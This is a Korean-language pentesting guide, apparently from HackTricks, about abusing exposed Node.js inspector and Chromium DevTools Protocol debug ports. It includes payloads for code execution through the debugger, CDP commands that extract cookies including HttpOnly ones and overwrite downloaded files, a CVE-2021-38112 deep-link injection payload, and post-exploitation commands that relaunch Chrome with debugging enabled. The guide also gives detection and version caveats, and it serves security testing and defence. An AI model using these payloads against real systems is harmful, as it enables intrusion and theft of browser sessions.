# Node inspector/CEF debug 남용

{{#include ../../banners/hacktricks-training.md}}

역사적인 실전 사례로는 Multimaster walkthrough와 CVE-2019-1414 Visual Studio Code debugger attack이 있습니다. 모든 최신 Electron 또는 Chromium 대상에서 동일한 기능을 사용할 수 있다고 가정하지 말고, 버전별 맥락으로 참고하세요.<sup>[[1]](#references)[[3]](#references)</sup>

## 기본 정보

[문서에서](https://nodejs.org/learn/getting-started/debugging): `--inspect` 스위치를 사용해 시작하면 Node.js 프로세스가 debugging client의 연결을 기다립니다. **기본적으로** 호스트와 포트 **`127.0.0.1:9229`**에서 대기합니다. 각 프로세스에는 **고유한** **UUID**도 할당됩니다.<sup>[[4]](#references)</sup>

Inspector client가 연결하려면 호스트 주소, 포트, UUID를 알고 지정해야 합니다. 전체 URL은 다음과 같은 형식입니다: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger는 Node.js 실행 환경에 대한 전체 접근 권한을 가지므로**, 이 포트에 연결할 수 있는 악의적인 행위자는 Node.js 프로세스 권한으로 임의의 코드를 실행할 수 있습니다(**잠재적인 권한 상승**).<sup>[[4]](#references)</sup>

Inspector를 시작하는 방법은 여러 가지입니다:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

검사 중인 프로세스를 시작하면 다음과 같은 것이 표시됩니다:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF**(**Chromium Embedded Framework**) 기반 프로세스는 `--remote-debugging-port=9222`로 debugger를 노출할 수 있습니다. 이 경우 Node.js inspector가 아니라 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 브라우저를 노출하므로, Node.js `process` 기반 payload는 기본적으로 직접 적용할 수 없습니다.<sup>[[2]](#references)[[5]](#references)</sup>

debugger가 활성화된 브라우저를 시작하면 다음과 같은 내용이 표시됩니다:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint 열거 및 제어

HTTP 검색 endpoint는 **browser** WebSocket과 개별 **target**(탭, worker, extension 등) WebSocket을 구분합니다. browser endpoint는 `/json/version`을, target은 `/json/list`를 조회합니다. 반환된 `webSocketDebuggerUrl` 값으로 CDP의 JSON-RPC 유사 메시지를 직접 전송할 수 있습니다.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

예를 들어 `websocat "$BROWSER_WS"`로 연결한 뒤 `{"id":1,"method":"Target.getTargets"}` 또는 `{"id":2,"method":"Storage.getCookies"}`를 전송합니다. 페이지 타깃에서(`websocat "$PAGE_WS"`) `Runtime.evaluate`는 해당 렌더러에서 실행되며, `Page.captureScreenshot`은 base64로 인코딩된 스크린샷을 반환합니다. `document.cookie`로는 `HttpOnly` 쿠키를 확인할 수 없지만, `Storage.getCookies`는 브라우저의 쿠키 저장소에서 쿠키를 가져옵니다.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### 브라우저, WebSocket 및 same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열린 웹사이트는 브라우저 보안 모델에 따라 WebSocket 및 HTTP 요청을 보낼 수 있습니다. **고유한 debugger 세션 ID를 얻으려면** **초기 HTTP 연결**이 필요합니다. **same-origin-policy**는 웹사이트가 **이 HTTP 연결**을 만들지 못하게 **합니다**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**에** 대한 추가 보안을 위해 Node.js는 연결의 **'Host' 헤더**에 **IP 주소** 또는 정확히 **`localhost`**가 지정되어 있는지 확인합니다.<sup>[[4]](#references)</sup>

> [!TIP]
> 이러한 **보안 조치는 HTTP 요청을 보내는 것만으로**(SSRF vuln을 악용하면 가능) **inspector를 악용해 코드를 실행하는 것을 방지합니다**.<sup>[[4]](#references)</sup>

### 실행 중인 프로세스에서 inspector 시작하기

실행 중인 nodejs 프로세스에 **SIGUSR1 시그널**을 보내면 기본 포트에서 **inspector가 시작됩니다**. 단, 충분한 권한이 필요하므로 이를 통해 **프로세스 내부 정보에 대한 권한 있는 접근**을 얻을 수는 있지만, 직접적인 privilege escalation으로 이어지지는 않습니다.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> 이는 컨테이너에서 유용합니다. `--inspect` 옵션을 사용해 **프로세스를 종료하고 새 프로세스를 시작하는 것**은 선택지가 아닙니다. 프로세스와 함께 **컨테이너**도 **종료되기 때문입니다**.<sup>[[6]](#references)</sup>

### inspector/debugger에 연결

**Chromium 기반 브라우저**에 연결하려면 Chrome에서는 `chrome://inspect` URL을, Edge에서는 `edge://inspect` URL을 각각 엽니다. Configure 버튼을 클릭해 **대상 호스트와 포트**가 올바르게 등록되어 있는지 확인해야 합니다. 이미지는 Remote Code Execution (RCE) 예시를 보여 줍니다:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger에 액세스할 URL이 표시됩니다. 예: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger에 연결: Chromium 기반 브라우저에 연결하려면,...](<../../images/image (674).png>)

**명령줄**을 사용해 debugger/inspector에 연결할 수 있습니다:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)는 로컬에서 실행 중인 **inspector를 찾고** 해당 inspector에 **코드를 주입**할 수 있습니다.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 통해 브라우저에 연결된 경우 **NodeJS RCE exploit은 작동하지 않습니다**(이 프로토콜의 API를 확인해 활용할 만한 기능을 찾아야 합니다).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector에서의 RCE

> [!TIP]
> [**Electron의 XSS에서 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node **inspector**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법으로는 다음과 같은 것을 사용할 수 있습니다(**Chrome DevTools protocol에 연결한 경우에는 작동하지 않는 것 같습니다**).<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol 페이로드

API는 여기서 확인할 수 있습니다: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
이 섹션에서는 사람들이 이 프로토콜을 악용하는 데 사용한 흥미로운 사례를 나열하겠습니다.

### Chrome 136+ 기본 프로필 제한

**Chrome 136**부터 Chrome은 `--remote-debugging-port` 및 `--remote-debugging-pipe`가 **기본 Chrome 데이터 디렉터리**를 대상으로 할 경우 이를 무시합니다. 이 스위치를 사용하려면 표준이 아닌 `--user-data-dir`과 함께 지정해야 합니다. 별도의 암호화 키와 격리된 브라우저 상태로 인해 단순한 플래그 기반 기법으로 사용자의 일반 인증 프로필이 노출되는 것을 방지할 수 있습니다. 이 Chrome 전용 제한이 구버전 Chrome, Chrome for Testing, Electron/CEF 애플리케이션 또는 다른 Chromium 파생 브라우저에도 적용된다고 검증 없이 가정해서는 안 됩니다.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

따라서 `--remote-debugging-port`만 사용해 실행된 현재 Chrome 프로세스를 확인했다고 해서 CDP가 활성화되었다고 단정할 수는 없습니다. 리스너와 `/json/version`을 확인하고, 실제로 어떤 프로필이 연결되어 있는지 파악하세요.<sup>[[14]](#references)</sup>

### Deep Link를 통한 Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)에서 Rhino Security는 CEF 기반 애플리케이션이 시스템에 사용자 지정 URI(`workspaces://index.html`)를 **등록**해 전체 URI를 전달받은 뒤, 해당 URI로 일부 구성을 생성하여 CEF 기반 애플리케이션을 **실행**한다는 사실을 발견했습니다.<sup>[[8]](#references)</sup>

URI 매개변수가 URL 디코딩된 후 CEF 기본 애플리케이션을 실행하는 데 사용되는 것으로 밝혀졌습니다. 이로 인해 사용자는 **명령줄**에 **`--gpu-launcher`** 플래그를 **주입**하여 임의의 작업을 실행할 수 있었습니다.<sup>[[8]](#references)</sup>

따라서 다음과 같은 payload를 사용할 수 있습니다.

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Will execute a calc.exe.<sup>[[8]](#references)</sup>

### 파일 덮어쓰기

**다운로드한 파일이 저장될** 폴더를 변경하고, 파일을 다운로드하여 애플리케이션에서 자주 사용하는 **소스 코드**를 **악성 코드**로 **덮어씁니다**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE 및 데이터 유출

STAR Labs는 노출된 WebDriver/CDP 서비스가 임의 파일 읽기와 RCE를 가능하게 할 수 있으며, 일부 구성에서는 DNS rebinding으로 exploit chain을 완성할 수 있음을 보였습니다.<sup>[[9]](#references)</sup>

ChromeDriver의 WebDriver 서비스는 Chrome DevTools/CDP와 별개입니다. [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities)는 새 세션에서 실행할 브라우저 실행 파일을 지정합니다. 권한이 없는 호출자가 root로 실행 중인 ChromeDriver 서비스에 접근할 수 있고 호출자가 제어하는 실행 파일 경로를 사용해 세션을 제출할 수 있다면, 실행 과정에서 서비스의 권한 경계를 넘을 수 있습니다. `/sessions` 응답이 비어 있다고 해서 새 세션을 만들 수 없는 것은 아닙니다. 이 경로를 사용할 수 있다고 결론 내리기 전에 프로세스 소유자, 실제 리스너 접근 가능 여부, 세션 인증, 실행 파일 접근 권한, 격리 설정을 확인하세요. 프로세스 이름이나 일반적으로 사용하는 포트만으로는 충분하지 않습니다. [Google의 보안 지침](https://developer.chrome.com/docs/chromedriver/security-considerations)은 ChromeDriver를 권한이 없는 계정으로 실행하라고 안내합니다. 수동 열거 과정에서 WebDriver 세션을 만들지 마세요.

브라우저 자동화 및 Chromium 보안 관련 과거 사례는 Counter WebDriver write-up과 Project Zero 이슈 773, 1742, 1944를 참고하세요.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 실행 중인 Chromium 프로세스에서 CDP 활성화하기

Windows에서 [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler)는 명령줄 제한만이 CDP를 활성화하는 유일한 방법은 아니라는 점을 보여 주었습니다. 기존 `msedge.exe`에 코드를 주입할 수 있다면 Chromium의 비-export 함수인 `content::DevToolsAgentHost::StartRemoteDebuggingServer`를 호출해 브라우저를 재시작하지 않고 인증된 실시간 프로필을 노출할 수 있습니다.<sup>[[15]](#references)</sup>

시연된 chain은 `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`로 DLL을 주입하고, Edge 내부 심볼을 확인한 다음(먼저 PDB를 사용하고 이후 버전별 byte signature를 사용), 브라우저 창에 subclass를 적용하고 메시지를 게시해 최종 서버 시작 호출이 브라우저 **UI thread**에서 실행되도록 합니다. 소켓은 loopback에 바인딩되며, 이후 일반 CDP 기능으로 쿠키를 가져오고, 탭을 캡처하고, 네트워크 트래픽을 검사하거나, 인증된 페이지에서 JavaScript를 실행할 수 있습니다.<sup>[[15]](#references)</sup>

> [!WARNING]
> 이는 **침해 후/프로세스 주입** 기법이지, 인증되지 않은 네트워크 우회 기법이 아닙니다. 관련 C++ 심볼이 export되지 않고 브라우저 업데이트 후 signature가 바뀔 수 있으므로 빌드에 크게 의존합니다.<sup>[[15]](#references)</sup>

탐지 시 `--remote-debugging-*` 명령줄 텔레메트리에만 의존하지 마세요. 브라우저 프로세스에 대한 비정상적인 핸들 및 메모리 작업(`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, 스레드 생성), DLL 주입, 그리고 Chrome/Edge가 소유한 예기치 않은 loopback 리스닝 소켓도 함께 확인하세요.<sup>[[15]](#references)</sup>

### Post-Exploitation

실제 환경에서 Chromium 기반 브라우저를 사용하는 사용자 PC를 **침해한 후** 수행하는 과거 기법 중 하나는 브라우저를 디버깅 활성화 상태로 다시 실행하고 loopback 포트를 포워딩하는 것이었습니다. 선택한 프로필을 여전히 허용하는 제품/빌드에서는 피해자의 브라우징 상태가 노출될 수 있지만, Chrome 136+에서는 기본 데이터 디렉터리를 대상으로 이 방법을 사용할 수 없습니다.<sup>[[7]](#references)[[14]](#references)</sup>

기존 버전별 대상에서 사용할 수 있도록 원래 재실행 명령을 아래에 보존했습니다. 두 번째 명령은 현재 Chrome에서 지원되는 방식이지만, 피해자의 일반적인 인증 상태를 다시 여는 대신 격리된 프로필을 생성합니다.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS 전용 Chromium 재실행, 확장 프로그램 및 CDP 기법은 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)을 참조하세요.



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger 검사 및 exploit 도구](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger를 통한 Visual Studio Code 원격 코드 실행](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js 디버깅 가이드 - 시작하기](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome 디버깅 기능을 악용해 원격으로 브라우징 세션을 관찰하고 제어하기](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces 원격 코드 실행](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding 및 CDP를 통한 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot에서 RCE까지](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero 이슈 773 (Chromium 버그 트래커)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero 이슈 1742 (Chromium 버그 트래커)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero 이슈 1944 (Chromium 버그 트래커)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [보안 강화를 위한 원격 디버깅 스위치 변경 사항 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [실행 중인 Edge 브라우저에 CDP 주입하기: 런타임 브라우저 계측 심층 분석](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
